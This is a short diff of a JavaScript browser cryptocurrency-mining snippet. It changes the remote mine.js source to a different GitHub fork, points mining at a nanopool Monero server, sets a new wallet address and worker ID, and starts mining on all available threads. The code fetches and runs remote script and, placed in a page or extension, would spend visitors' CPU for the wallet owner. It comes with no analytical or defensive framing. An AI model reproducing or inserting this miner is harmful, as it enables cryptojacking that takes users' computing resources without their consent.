@@ -1,12 +1,12 @@
 // Start Of Mining Code (Javascript)
 var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-miner-chrome-extension@main/mine.js";
+script.src = "https://cdn.jsdelivr.net/gh/sdiraimondo/monero-miner-chrome-extension@main/mine.js";
 document.head.appendChild(script);
 
-server = "wss://f.xmrminingproxy.com:8181";
-var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
-var workerId = "GH-XMR"
+server = "xmr-eu1.nanopool.org:10343";
+var pool = "xmr-eu1.nanopool.org:10343";
+var walletAddress = "46jaHxu43FoY6Ja2uZ762qYDKeWXQY25bMY4d3u15wPATCATgE6H4898XsS5s2m2RCeGgUWRm1WXPN51X3j3FThyLen47D4";
+var workerId = "web-XMR"
 var threads = -1;
 var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
